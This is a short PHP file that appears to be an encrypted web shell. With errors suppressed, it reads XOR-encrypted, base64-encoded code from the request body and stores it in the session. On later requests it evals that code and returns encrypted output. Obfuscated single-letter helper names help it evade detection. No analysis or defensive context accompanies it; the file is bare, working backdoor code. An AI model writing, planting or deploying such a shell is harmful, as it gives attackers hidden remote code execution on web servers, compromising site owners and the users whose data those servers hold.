<?php
session_start();
@set_time_limit(0);
@error_reporting(0);
function E($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $D[$i] = $D[$i]^$K[$i+1&15];
    }
    return $D;
}
function Q($D){
    return base64_encode($D);
}
function O($D){
    return base64_decode($D);
}
function I(){
    return "php://input";
}
$V='payload';
$T='3c6e0b8a9c15224a';

    $F=O(E(file_get_contents(I()),$T));
    if (isset($_SESSION[$V])){
        $L=$_SESSION[$V];
        $A=explode('|',$L);
        class C{public function nvoke($p) {eval($p."");}}
        $R=new C();
		$R->nvoke($A[0]);
        echo E(run($F),$T);
    }else{
        $_SESSION[$V]=$F;
    }
